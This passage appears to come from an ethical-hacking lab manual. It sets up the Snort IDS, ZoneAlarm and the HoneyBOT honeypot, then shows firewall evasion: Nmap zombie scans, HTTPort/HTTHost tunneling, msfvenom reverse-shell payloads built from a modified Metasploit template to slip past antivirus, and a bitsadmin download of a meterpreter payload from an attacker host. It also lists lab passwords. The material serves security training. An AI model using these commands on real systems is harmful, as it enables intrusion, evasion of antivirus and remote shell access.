Scroll down to RULE_PATH (Line 104). In Line 104, replace ../rules with C:\Snort\rules in Line 105, replace ../so_rules with C:\Snort\so_rules and in Line 106, replace ../preproc_rules with C:\Snort\preproc_rules.

zi4fjftd.jpg

In Lines 109 and 110, replace ../rules with C:\Snort\rules. Minimize the Notepad++ window.

rrrj4bcj.jpg

Navigate to C:\Snort\rules, and create two text files; name them white_list and black_list and change their file extensions from .txt to .rules.

To create a text file, right-click anywhere inside the rules window and navigate to New --> Text Document.

While changing the extension, if any pop-up appears, click Yes.

Switch back to Notepad++, scroll down to the Step #4: Configure dynamic loaded libraries section (Line 238). Configure dynamic loaded libraries in this section.

Add the path to dynamic preprocessor libraries (Line 243); replace /usr/local/lib/snort_dynamicpreprocessor/ with your dynamic preprocessor libraries folder location.

In this task, the dynamic preprocessor libraries are located at C:\Snort\lib\snort_dynamicpreprocessor.

At the path to base preprocessor (or dynamic) engine (Line 246), replace /usr/local/lib/snort_dynamicengine/libsf_engine.so with your base preprocessor engine C:\Snort\lib\snort_dynamicengine\sf_engine.dll.

Ensure that the dynamic rules libraries (Line 250) is commented out, as you have already configured the libraries in dynamic preprocessor libraries.

Add (space) in between # and dynamicdetection (Line 250).

p5p00kqi.jpg

Scroll down to the Step #5: Configure preprocessors section (Line 253), the listed preprocessor. This does nothing in IDS mode, however, it generates errors at runtime.

Comment out all the preprocessors listed in this section by adding ‘#’ and (space) before each preprocessor rule (262-266).

To ‘comment out’ is to render a block of code inert by turning it into a comment.

kqxl3npz.jpg

Scroll down to line 326 and delete lzma keyword and a (space).

o5c0ug0l.jpg

Scroll down to Step #6: Configure output plugins (Line 513). In this step, provide the location of the classification.config and reference.config files.

These two files are in C:\Snort\etc. Provide this location of files in the configure output plugins (in Lines 532 and 533) (i.e., C:\Snort\etc\classification.config and C:\Snort\etc\reference.config).

3dmgjbqx.jpg

In Step #6, add to line (534) output alert_fast: alerts.ids: this command orders Snort to dump all logs into the alerts.ids file.

iqniitkq.jpg

In the snort.conf file, find and replace the ipvar string with var. To do this, press Ctrl+H on the keyboard. The Replace window appears; enter ipvar in the Find what : text field, enter var in the Replace with : text field, and click Replace All.

You will get a notification saying 11 occurrences were replaced.

By default, the string is ipvar, which is not recognized by Snort: replace with the var string, and then close the window.

Snort now supports multiple conﬁgurations based on VLAN Id or IP subnet within a single instance of Snort. This allows administrators to specify multiple snort conﬁguration ﬁles and bind each conﬁguration to one or more VLANs or subnets rather than running one Snort for each conﬁguration required.

Screenshot

Click Close to close the Replace window.

Save the snort.conf file by pressing Ctrl+S and close Notepad++ window.

Before running Snort, you need to enable detection rules in the Snort rules file. For this task, we have enabled the ICMP rule so that Snort can detect any host discovery ping probes directed at the system running Snort.

Navigate to C:\Snort\rules and open the icmp-info.rules file with Notepad++.

In line 21, type alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.19 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;) and save. Close the Notepad++ window.

The IP address (10.10.1.19) mentioned in $HOME_NET may vary when you perform this task.

gcgqqcol.jpg

Now right-click on the Windows Start icon and click Run from the menu.

In the Run window, type cmd in the Open field and press Enter: This will launch a command prompt window.

In the command prompt window, type cd C:\Snort\bin and press Enter.

Type snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii and press Enter to start Snort (replace X with your device index number; in this task: X is 1).

Screenshot

If you receive a fatal error, you should first verify that you have typed all modifications correctly into the snort.conf file, and then search through the file for entries matching your fatal error message.

If you receive an error stating “Could not create the registry key,” then run the command prompt as Administrator.

Snort starts running in IDS mode. It first initializes output plug-ins, preprocessors, plug-ins, loads dynamic preprocessors libraries, rule chains of Snort, and then logs all signatures.

If you have entered all command information correctly, you receive a comment stating Commencing packet processing (pid=xxxx) (the value of xxxx may be any number; in this task, it is 5384), as shown in the screenshot.

hekm3ixx.jpg

After initializing interface and logged signatures, Snort starts and waits for an attack and triggers alerts when attacks occur on the machine.

Leave the Snort command prompt running.

Attack your own machine, and check whether Snort detects it or not.

Now, click on Windows 11 to switch to the Windows 11 machine (Attacker Machine). Click Ctrl+Alt+Delete to activate the machine.

Alternatively, you can also click Ctrl+Alt+Delete button under Windows 11 machine thumbnail in the Resources pane or Click Ctrl+Alt+Delete button under Commands (thunder icon) menu.

By default, Admin user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows 11 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Networks screen appears, click Yes to allow your PC to be discoverable by other PCs and devices on the network.

Screenshot

Open the command prompt and issue the command ping 10.10.1.19 -t from the Attacker Machine

10.10.1.19 is the IP address of the Windows Server 2019. This IP address may differ when you perform the task.

Screenshot

Click Windows Server 2019 to return to the Windows Server 2019 machine. Observe that Snort triggers an alarm, as shown in the screenshot:

Screenshot

Press Ctrl+C to stop Snort; snort exits.

Screenshot

Go to the C:\Snort\log\10.10.1.11 folder and open the ICMP_ECHO.ids file with Notepad++. You see that all the log entries are saved in the ICMP_ECHO.ids file.

The folder name 10.10.1.11 might vary when you perform the task, depending on the IP address of the Windows 11 machine.

Screenshot

This means that whenever an attacker attempts to connect or communicate with the machine, Snort immediately triggers an alarm

This will make you aware of the intrusion and can thus take certain security measures to disconnect the lines of communication with the attacker’s machine.

Close all open windows in the Windows 11 and Windows Server 2019 machines.

========
Task 2: Detect Malicious Network Traffic using ZoneAlarm FREE FIREWALL
========

ZoneAlarm FREE Firewall blocks attackers and intruders from accessing your system. It manages and monitors all incoming and outgoing traffic and shields the network from hackers, malware, and other online threats that put network privacy at risk, and monitors programs for suspicious behavior spotting and stopping new attacks that bypass traditional anti-virus protection. This Firewall prevents identity theft by guarding your data, and erases your tracks allowing you to surf the web in complete privacy. Furthermore, it locks out attackers, blocks intrusions, and makes your PC invisible online. Additionally, it filters out annoying, as well as potentially dangerous, email.

Before starting this task, we will browse an unwanted website in the Windows 11 machine. Assume that www.moviescope.com is an unwanted site that is not supposed to be browsed in your network.

www.moviescope.com is a local website that is hosted and configured in the Windows Server 2019 machine.

Click Windows 11 to switch to the Windows 11 machine.

Open any browser (here, Google Chrome) and place the cursor in the address bar, type www.moviescope.com and press Enter.

As you can observe that www.moviescope.com can be browsed in the Windows 11 machine.

In this task, we are going to block this site from browsing. Close the Google Chrome browser.

Screenshot

In the Windows 11 machine, navigate to E:\CEH-Tools\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Firewalls\ZoneAlarm FREE FIREWALL and double-click zafwSetupWeb_158_189_19019.exe to install ZoneAlarm FREE FIREWALL.

Screenshot

If the User Account Control pop-up appears, click Yes.

The ZoneAlarm Free Firewall Install wizard appears; check By clicking here, you accept the terms of the Privacy Policy, and then click Custom Install.

1daryqpp.jpg

The End User License Agreement wizard appears; click Agree >.

Screenshot

In the Application Control Mode wizard, ensure that the Set Application Control to AUTO-LEARN mode option is selected, and click Next >.

By choosing this mode, Zone Alarm Firewall configures the security settings based on behavior and automates this process for your network.

Screenshot

Click the Skip button in the Add our Free Chrome Extension for Safer Browsing wizard.

If you wish to enable this option, click Add to Chrome. In this task, we are choosing to skip this option.

Screenshot

ZoneAlarm Free Firewall starts downloading and configuring the components to your machine.

Wait until the installation is completed: this may take a few minutes to install.

Screenshot

The Installation was Successful! wizard appears; click FINISH.

As soon as you click the Finish button, the ZoneAlarm webpage opens in your default browser window; close the browser.

Screenshot

The ZoneAlarm main window appears, as shown in the screenshot. Click the FIREWALL button to configure the firewall settings.

Screenshot

In the FIREWALL tab, click View Zones under the Basic Firewall section.

Screenshot

The Firewall Settings window appears with the View Zones tab selected; click Add >> and click the Host/Site option from the menu, as shown in the screenshot.

Screenshot

The Add Zone window appears; choose the following:

Zone: Blocked

Hostname: www.moviescope.com

Description: Block This Site

Click Lookup; by doing this, we are blocking unwanted sites from browsing

You can provide any site that you wish to block.

www.moviescope.com is the local website that is configured on Windows Server 2019.

Screenshot

As soon as you click Lookup, the IP address of www.moviescope.com appears in the text field; click OK.

Screenshot

The newly added rule appears in the View Zones section, as shown in the screenshot; click OK.

Screenshot

Open any browser (here, Google Chrome) and now try to browse the blocked website, that is, www.moviescope.com.

As you have created a rule in ZoneAlarm Firewall to block www.moviescope.com from browsing, you will receive a message as Your Internet access is blocked.

Screenshot

This is how you can block access for unwanted sites from browsing.

Before proceeding for the next task, go to the ZoneAlarm Firewall Settings window, select the newly created rule in the View Zones section, click Remove, and click OK.

If a Delete Confirmation pop-up appears, click Yes.

This will remove the block access for the www.moviescope.com site.

Screenshot

Close the ZoneAlarm main window.

Click Show hidden icon from the lower right section of Desktop. Right-click the ZoneAlarm icon and click Exit from the context menu.

Screenshot

If a Shut down pop-up appears, click Yes.

Restart the Windows 11 machine.

After the system reboots, click Ctrl+Alt+Delete. By default, Admin user account is selected, click Pa$$w0rd to enter the password and press Enter to log in.

Screenshot

Uninstall ZoneAlarm in the Windows 11 machine. To do so, launch Control Panel --> Programs --> Programs and Features. In the Programs and Features window, choose ZoneAlarm Free Firewall and click Uninstall. Follow the wizard-driven uninstallation process to remove ZoneAlarm from the Windows 11 machine.

Screenshot

If a ZoneAlarm pop-up appears, click Yes to continue the uninstallation. After the uninstallation is completed, you will receive a prompt to restart the machine; click Yes to restart..

Once the system reboots, turn off the Windows Defender Firewall.

In the Windows Defender Firewall window, click the Turn Windows Defender Firewall on or off link in the left pane of the window
In the Customize Settings window, select the Turn off Windows Defender Firewall (not recommended) radio button for all Domain, Private and Public network settings, and then click OK
Again, in the Windows Defender Firewall window, click Advanced settings link in the left pane
Once the Windows Defender Firewall with Advanced Security appears on the screen, click the Windows Defender Firewall Properties link in the Overview section
The Windows Defender Firewall with Advanced Security on Local Computer Properties window appears; in the Domain Profile tab, choose Off from the Firewall state drop-down list. Then, navigate to the Private Profile and Public Profile tabs and ensure that the Firewall state is Off. Click Apply, and then click OK
Close all open windows.

You can also use other firewalls such as ManageEngine Firewall Analyzer (https://www.manageengine.com), pfSense (https://www.pfsense.org), Sophos XG Firewall (https://www.sophos.com), and Comodo Firewall (https://personalfirewall.comodo.com) to block access to a particular website or IP address.

========
Task 3: Detect Malicious Network Traffic using HoneyBOT
========

Here, we will use the HoneyBOT tool to detect malicious network traffic.

Click Windows Server 2022 to switch to the Windows Server 2022 machine. Click Ctrl+Alt+Delete to activate the machine. By default, CEH\Administrator user profile is selected, click Pa$$w0rd to paste the password in the Password field and press Enter to login.

Alternatively, you can also click Pa$$w0rd under Windows Server 2022 machine thumbnail in the Resources pane or Click Type Text | Type Password button under Commands (thunder icon) menu.

Screenshot

Navigate to Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Honeypot Tools\HoneyBOT. Double-click HoneyBOT_018.exe to launch the HoneyBOT installer. Follow the wizard-driven steps to install HoneyBOT.

if the User Account Control window appears, click Yes.

Screenshot

Once the installation of HoneyBOT completes, in the Completing the HoneyBot Setup Wizard window, uncheck the Launch HoneyBOT option, click Finish.

Screenshot

Now, click the Start icon from the left-bottom of Desktop. Under Recently added applications, right-click HoneyBOT --> More --> Run as administrator, as shown in the screenshot.

Screenshot

The HoneyBOT configuration pop-up appears; click Yes to configure HoneyBOT.

Screenshot

The HoneyBOT Options window appears with default options checked on the General settings tab. Leave the default settings or modify them accordingly.

In this task, we are leaving the settings on default for the General tab in the Options window.

Screenshot

Click the Email Alert tab; if you want HoneyBOT to send you email alerts, check Send Email Alerts, and fill in the respective fields.

In this task, we will not be providing any details for email alerts.

Screenshot

On the Exports tab, in which you can export the logs recorded by HoneyBOT, choose the required option to view the reports, and then proceed to the next step. (here, Export Logs to CSV and Upload Logs to Server checkbox are selected)

Screenshot

On the Updates tab, uncheck Check for Updates; click Apply and click OK to continue.

If a Bindings pop-up appears, click OK to continue.

Screenshot

The HoneyBOT main window appears, as shown in the screenshot.

Screenshot

Now, leave the HoneyBOT window running on Windows Server 2022.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

In the terminal window; type telnet [IP Address of the Windows Server 2022 machine] and press Enter.

You will be prompted for the telnet credentials of the Windows Server 2022 machine.

In this task, the IP address of Windows Server 2022 is 10.10.1.22; this may differ when you perform this task.

Screenshot

Click Windows Server 2022 to switch back to the Windows Server 2022 machine. In the HoneyBOT window, expand the Ports and Remotes node from the left-pane.

Under Ports, you can see the port numbers from which Windows Server 2022 received requests or attacks.

Under Remotes, you can view the recorded IP addresses through which Windows Server 2022 received requests.

Screenshot

Now, right-click any IP address or Port on the left, and click View Details, as shown in the screenshot, to view the complete details of the request or attack recorded by HoneyBOT.

Screenshot

The Packet Log window appears, as shown in the screenshot. This displays the complete log details of the request captured by HoneyBOT.

In the screenshot, under Connection Details, you can view the Date and Time of the connection established as well as the protocol used.

Connection Details also shows the Source IP, Port, and Server Port, as shown below.

Simultaneously, you can run the ftp command on the Parrot Security machine and observe the log recorded by HoneyBOT on Windows Server 2022.

Screenshot

After the completion of this task, End the lab instance, re-launch it and continue with the next lab.

To End the lab instance, click on the Menu icon from the top-right corner of the screen and click End from the options. In the Are you sure you want to end this lab?, click Yes, end my lab.

########
Lab 2 - Evade Firewalls using various evasion techniques.
########

========
Task 1: Bypass Windows Firewall using Nmap Evasion Techniques
========

Click on Windows 11 to switch to the Windows 11 machine.

Open the Control Panel; navigate to System and Security --> Windows Defender Firewall and click Use recommended settings to turn on Firewall.

Screenshot

Now, you can see that the Firewall is enabled in the Windows 11 machine. Click the Advanced settings link in the left pane.

Screenshot

The Windows Defender Firewall with Advanced Security window appears; here, we are going to create an inbound rule. Select Inbound Rules in the left pane and click New Rule under Actions.

Screenshot

The New Inbound Rule Wizard appears. In the Rule Type section, choose the Custom radio button to create a custom inbound rule and click Next.

Screenshot

In the Program section, leave the settings to default and click Next.

Screenshot

In the Protocol and Ports section, leave the settings to default and click Next.

Screenshot

In the Scope section, choose the These IP addresses radio button under Which remote IP addresses does this rule apply to?, and then click Add.

Screenshot

The IP Address pop-up appears; type the IP address of the Parrot Security machine and click OK (here, the IP address of Parrot Security machine is 10.10.1.13).

Screenshot

Click Next in the Scope section once the IP address has been added.

Screenshot

In the Action section, choose the Block the connection radio button and click Next.

By doing this, we are blocking all incoming traffic that comes through the Parrot Security machine.

Screenshot

In the Profile section, leave the settings on default and click Next. By doing this, the newly created rule will apply to all profiles.

Screenshot

In the Name section, provide any name to the rule (here, Block Parrot Security) and click Finish.

Screenshot

The newly created inbound rule has been configured to the Windows 11 Firewall. Now, any Incoming traffic coming through the Parrot Security machine will be blocked by the Windows 11 Firewall.

Screenshot

Close all open windows in the Windows 11 machine and click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, type cd and press Enter to jump to the root directory.

Screenshot

We will now perform a basic Nmap scan on Windows 11 machine.

Type nmap 10.10.1.11 and press Enter. As the Firewall is turned on in the Windows 11 machine, the output of the Nmap scan shows that all the 1,000 scanned ports on 10.10.1.11 are filtered.

The IP address of the Windows 11 machine may differ when you perform this task.

Screenshot

We will now perform TCP SYN Port Scan on the Windows 11 machine and observe the results.

Type nmap -sS 10.10.1.11 and press Enter. Observe that the results are the same as when the Windows 11 Firewall is turned on.

Screenshot

Now, perform INTENSE Scan. Type nmap -T4 -A 10.10.1.11 and press Enter. We still receive the same result as when the Firewall is turned on.

Here, -T4 switch refers to the Aggressive (4) speeds scans and -A switch enables OS detection, version detection, script scanning, and traceroute.

Screenshot

We will now perform a Ping Sweep scan on the subnet to discover the live machines in the network. Type nmap -sP 10.10.1.0/24 and press Enter. In the output of the Nmap, you will be able to find the live machines on the network, as shown in the screenshot.

As per the scan result, you can observe that the Windows Server 2019 machine is Active (10.10.1.19).

Screenshot

Now, perform a Zombie Scan. Type nmap -sI 10.10.1.22 10.10.1.11 and press Enter. You can see that various ports and services are open, as shown in the screenshot.

You can perform a Zombie scan by choosing any of the IPs that are obtained in the ping sweep scan. In this task, we are choosing Windows Server 2022 as the Zombie.

2022-04-20_11-35-48.png

Click Windows 11 to switch to the Windows 11 machine and delete the newly created rule in the Windows Defender Firewall with Advanced Security window.

Screenshot

Turn off the Windows Defender Firewall for all Profiles in the Windows 11 machine.

Screenshot

Close all open windows in each machine.

========
Task 2: Bypass Firewall Rules using HTTP/FTP Tunneling
========

Here, we will learn how networks can be scanned, and how to use HTTPort and HTTHost to bypass firewall restrictions and access files.

Click Windows Server 2022 to switch to the Windows Server 2022 machine.

Now, you must ensure that IIS Admin Service and World Wide Web Publishing services are not running

Click Start and click the Windows Administrative Tools app. The Windows Administrative Tools window appears; double-click Services to launch.

Screenshot

In the Services window, scroll down to World Wide Web Publishing Service and you can observe that the service is Disabled under the Startup Type column, as shown in the screenshot.

If World Wide Web Publishing Service is Enabled disable it by double clicking the service and in the World Wide Web Publishing Service Properties window in Startup type select Disabled from the drop down and click Apply and OK.

Screenshot

Similarly, check IIS Admin Service; stop the program if it is running.

Navigate to Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTHost and double-click htthost.exe.

Screenshot

If the Open File - Security Warning pop-up appears, click Run.

A HTTHost wizard appears; click the Options tab.

On the Options tab, leave 90 as the port number in the Port field under the Network section. Keep the other settings on default, except for Personal password, which should contain any other password. In this task, the Personal password is “magic.”

Typically, HTTP tunneling should be performed using port 80. Port 80 is being used to host the local websites, therefore we have used port 90 for this task.

Ensure that Revalidate DNS names and Log connections are checked and click Apply.

vcfipzj5.jpg

Navigate to the Application log tab and check if the last line is Listener: listening at 0.0.0.0:90, which ensures that HTTHost is running properly and has begun to listen on port 90.

Screenshot

Now, leave HTTHost running, and do not turn off the Windows Server 2022 machine.

Now, click Windows Server 2019 to switch to the Windows Server 2019 machine and launch Control Panel, as shown in the screenshot.

Screenshot

The Control Panel window appears, click System and Security. In System and Security window select Windows Defender Firewall.

Screenshot

The Windows Defender Firewall control panel appears; click the Turn Windows Defender Firewall on or off link in the left pane.

Screenshot

The Customize Settings window appears.

Select Turn on Windows Defender Firewall under Private network settings and Public network settings.

Click OK.

Screenshot

The firewall is successfully turned on. Now, click Advanced settings in the left pane.

Screenshot

The Windows Firewall with Advanced Security window appears.

Select Outbound Rules in the left pane. A list of outbound rules is displayed. Click New Rule… in the right pane under Outbound Rules.

Screenshot

In New Outbound Rule Wizard, select Port as Rule Type and click Next.

Screenshot

Select All remote ports in Protocol and Ports and click Next.

Screenshot

In Action, Block the connection is selected by default and click Next.

Screenshot

In the Profile section, ensure that all options (Domain, Private, and Public) are checked and click Next.

Screenshot

In Name, type Port 21 Blocked in the Name field and click Finish.

Screenshot

The new rule Port 21 Blocked is created, as shown in the screenshot.

Screenshot

Right-click the newly created rule (Port 21 Blocked) and click Properties.

Screenshot

The Properties window for Port 21 Blocked rule appears.

Select the Protocols and Ports tab. In the Remote port: field, select the Specific Ports option from the drop-down list and enter the port number as 21.

Leave the other default settings, click Apply, and then click OK.

Screenshot

Disable the rule and confirm that you can connect to the ftp site.

Right-click the newly added rule and click Disable Rule.

Screenshot

Launch the command prompt and issue ftp 10.10.1.11. You will be asked to enter the username.

Screenshot

In the above-mentioned command, 10.10.1.11 refers to the IP address of Windows 11 where the ftp site is located. Make sure that you issue the IP address of Windows 11 in your lab environment.

This means you can establish an FTP connection, and then close the command prompt window.

Now, enable the rule and check whether you can establish a connection.

Right-click the newly added rule and click Enable Rule.

Launch Command Prompt and check whether you can connect to the ftp site by issuing the command ftp 10.10.1.11.

The added outbound rule should block the connection, as shown in the screenshot.

Screenshot

In the above-mentioned command, 10.10.1.11 refers to the IP address of Windows 11, where the ftp site is located. Make sure that you issue the IP address of Windows 11 in your lab environment.

Now, we will perform tunneling using HTTPort to establish a connection with the FTP site located on Windows 11.

Navigate to Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTPort and double-click httport3snfm.exe.

Screenshot

If a User Account Control pop-up appears, click Yes.

Follow the installation steps to install HTTPort.

Screenshot

Launch HTTPort (Httport3SNFM) from the Start menu.

Screenshot

An Introduction to HTTPort wizard appears; click Next five times, until you come to the last wizard pane, and then click Close.

Screenshot

The HTTPort main window (HTTPort 3.SNFM) appears, as shown in the screenshot.

On the Proxy tab, enter the Host name or IP address (10.10.1.22) of the machine where HTTHost is running (Windows Server 2022).

The IP address of Windows Server 2022 may vary when you perform the task.

Enter the Port number 90.

In the Misc. options section, select Remote host from the Bypass mode drop-down list.

In the Use personal remote host at (blank = use public) section, re-enter the IP address of Windows Server 2022 (10.10.1.22) and port number 90.

Enter the password magic into the Password field.

Screenshot

Select the Port mapping tab, and click Add to create a new mapping.

Screenshot

Right-click the New mapping node, and click Edit.

Screenshot

Rename this as ftp test (you can enter the name of your choice).

Right-click the node below Local port; then click Edit and enter the port value as 21.

Right-click the node below Remote host; click Edit and rename it as 10.10.1.11.

Right-click the node below Remote port; then click Edit and enter the port value as 21.

10.10.1.11 specifies in Remote host node is the IP address of the Windows 11 machine that is hosting the FTP site.

Screenshot

Switch to the Proxy tab and click Start to begin the HTTP tunneling.

If you get an error, ignore it.

Screenshot

HTTPort intercepts the ftp request to the localhost and tunnels through it. HTTHost is installed in the remote machine to connect you to 10.10.1.11.

This means you may not access the ftp site directly by issuing ftp 10.10.1.11 in the command prompt, but you will be able to access it through the localhost by issuing the command ftp 127.0.0.1.

In Windows Server 2019; launch Command Prompt, type ftp 10.10.1.11, and press Enter. The ftp connection will be blocked by the outbound firewall rule.

Screenshot

Now, launch a new Command Prompt, type ftp 127.0.0.1, and press Enter. You should be able to connect to the site.

If you issue this command without starting HTTPort, the connection to the FTP site fails, stating that the FTP connection is refused.

Screenshot

Enter the credentials of any user account on Windows 11. In this task, we are using the credentials of the Jason account (username: Jason; Password: qwerty). Type the username and press Enter.

The password you enter will not be visible.

Screenshot

You are successfully logged in, even after adding a firewall outbound rule inferring that a tunnel has been established by HTTPort and HTTHost and therefore have bypassed the firewall.

Now you have the access and ability to add files in the ftp directory located in the Windows 11 machine.

Type mkdir Test and press Enter.

Screenshot

Now, Click Windows 11 to switch to the Windows 11 machine.

A directory named Test will be created in the FTP folder on the Windows 11 (location: C:\FTP) machine, as shown in the screenshot:

Screenshot

Thus, you are able to bypass HTTP proxies as well as firewalls, and thereby access files beyond them.

On completion of the task, delete the created outbound rule, stop HTTHost and HTTPort and disable the firewall (which was enabled in the beginning of the task) in the machine (i.e., Windows Server 2019), and start the World Wide Web Publishing and IIS Admin Services on the Windows Server 2022 machine.

========
Task 3: Bypass Antivirus using Metasploit Templates
========

Antivirus software is designed to detect malicious processes or files and prevent their execution on endpoints. There are various techniques that can be used for bypassing antivirus and execute the malicious processes in the target machine.

Here, we will modify Metasploit templates to bypass antivirus detection.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

In the terminal window, type msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Windows.exe and press Enter, to generate payload.

Screenshot

Double click on Firefox icon, to open Firefox browser and type https://www.virustotal.com in the address bar and press Enter.

Screenshot

Screenshot

In the VirusTotal website click on Choose file option, in the File Upload window navigate to the /home/attacker directory and select Windows.exe file and click on Open.

Screenshot

Once the file is uploaded click on Confirm upload button to start the analysis.

Screenshot

After completing the analysis VirusTotal website shows the number of antivirus that have detected the virus.

Screenshot

In the above screenshot we can see that 54 out of 70 antivirus vendors have detected the malicious file.

The result might differ when you perform this task.

In the terminal, type pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c and press Enter.

Screenshot

A template.c file appears, in the line 3 change the payload size from 4096 to 4000, save the file and close the editor.

Screenshot

Now, type cd /usr/share/metasploit-framework/data/templates/src/pe/exe/ in the terminal and press Enter to navigate to exe folder.

Type i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe and press Enter, to recompile the standard template.

Screenshot

Type ls and press Enter to list the contents of the exe folder.

Screenshot

In a new terminal generate a payload using new template by the following command, msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe

Screenshot

Now, switch back to the browser window and in the virustotal page, click on Upload file button on the top of the page.

Screenshot

In the File Upload window, select bypass.exe file from /home/atttacker location and click Open.

Screenshot

After selecting the file click on Confirm upload button, virustotal will analyze the detection of malicious file.

Screenshot

Screenshot

You can observe that now only 48 out of 71 antivirus vendors have detected the malicious file, thus we can evade antivirus detection by modifying Metasploit templates.

The result might differ when you perform this task.

Close all open windows.

========
Task 4: Bypass Firewall through Windows BITSAdmin
========

Here, we will use BITSAdmin to bypass firewall and transfer malicious file into the target machine.

Click Windows Server 2019 to switch to the Windows Server 2019 machine and launch Control Panel, as shown in the screenshot.

Screenshot

The Control Panel window appears, click System and Security. In System and Security window select Windows Defender Firewall.

Screenshot

The Windows Defender Firewall control panel appears; click the Turn Windows Defender Firewall on or off link in the left pane.

Screenshot

The Customize Settings window appears.

Select Turn on Windows Defender Firewall under Private network settings and Public network settings.

Click OK.

Screenshot

Click Parrot Security to switch to the Parrot Security machine.

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

If a Question pop-up window appears asking you to update the machine, click No to close the window.

Screenshot

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Screenshot

In the terminal window, type msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe and press Enter, to create the payload.

Screenshot

Now, create a directory to share this file with the target machine, provide the permissions, and copy the file from /home/attacker to the shared location using the below commands:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
Copy the malicious file to the shared location by typing cp /home/attacker/Exploit.exe /var/www/html/share and pressing Enter
Screenshot

Now, start the Apache service. To do this, type service apache2 start and press Enter.

Screenshot

Click Windows Server 2019 to switch to Windows Server 2019 machine.

In the Type here to search field of the Desktop, type powershell and click Windows PowerShell to launch a PowerShell.

Screenshot

In the PowerShell window, type bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe and press Enter.

Screenshot

BITSAdmin transfers the file, as shown in the screenshot.

Screenshot

Open File Explorer and Navigate to C: drive, you can see that the malicious file is successfully transferred.

Screenshot

After transferring the malicious file the attacker can use this malicious file for gaining access, escalating privileges and to perform various malicious other activities.

This concludes the demonstration of bypassing firewall through Windows BITSAdmin.

Close all open windows and document all acquired information.

########
Module 13 - Hacking Web Servers
########

########
Lab 1: Footprint the Web Server
########

========
Task 1: Information Gathering using Ghost Eye
========

Ghost Eye is an information-gathering tool written in Python 3. To run, Ghost Eye only needs a domain or IP. Ghost Eye can work with any Linux distros if they support Python 3.

Ghost Eye gathers information such as Whois lookup, DNS lookup, EtherApe, Nmap port scan, HTTP header grabber, Clickjacking test, Robots.txt scanner, Link grabber, IP location finder, and traceroute.

Click Parrot Security to switch to the Parrot Security machine.

Screenshot

In the login page, the attacker username will be selected by default. Enter password as toor in the Password field and press Enter to log in to the machine.

Screenshot

Click the MATE Terminal icon at the top of the Desktop window to open a Terminal window.

If a Question pop-up window appears asking for you to update the machine, click No to close the window.

A Parrot Terminal window appears. In the terminal window, type sudo su and press Enter to run the programs as a root user.

In the [sudo] password for attacker field, type toor as a password and press Enter.

The password that you type will not be visible.

Now, navigate to the Ghost Eye directory. Type cd ghost_eye and press Enter.

Screenshot

In the terminal window, type pip3 install -r requirements.txt and press Enter.

Screenshot

To launch Ghost Eye, type python3 ghost_eye.py and press Enter.

Screenshot

The Ghost Eye - Information Gathering Tool options appear, as shown in the screenshot.

Let us perform a Whois Lookup. Type 3 for the Enter your choice: option and press Enter.

Type certifiedhacker.com in the Enter Domain or IP Address: field and press Enter

Screenshot

Scroll up to see the certifiedhacker.com result. In the result, observe the complete information of the certifiedhacker.com domain such as Domain Name, Registry Domain ID, Registrar WHOIS Server, Registrar URL, and Updated Date.

Screenshot

Let us perform a DNS Lookup on certifiedhacker.com. In the Enter your choice field, type 2 and press Enter to perform DNS Lookup.

The Enter Domain or IP Address field appears; type certifiedhacker.com, and press Enter.

Screenshot

As soon as you hit Enter, Ghost Eye starts performing a DNS Lookup on the targeted domain (here, certifiedhacker.com).

Scroll up to view the DNS Lookup result.

Screenshot

Now, perform the Clickjacking Test. Type 6 in the Enter your choice field and press Enter.

In the Enter the Domain to test field, type certifiedhacker.com and press Enter.

Screenshot

By performing this test, Ghost Eye will provide the complete architecture of the web server, and also reveal whether the domain is vulnerable to Clickjacking attacks or not.

Screenshot

